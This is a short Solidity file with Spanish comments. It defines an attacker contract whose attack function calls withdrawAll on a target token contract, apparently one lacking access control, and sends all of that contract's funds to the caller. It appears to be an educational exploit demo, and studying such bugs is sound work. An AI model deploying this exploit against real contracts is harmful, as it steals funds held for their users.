// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ITokenBadAccessControl {
    function withdrawAll(address payable _to) external;
}

contract BadAccessControlAttack {
    // Variables    
    ITokenBadAccessControl public target;

    // Constructor
    constructor(address _target) {
        target = ITokenBadAccessControl(_target);
    }

    //Funcion de ataque
    function attack() public {
        // Llamada a sacar fondos del contrato
        target.withdrawAll(payable(msg.sender)); 
    }
}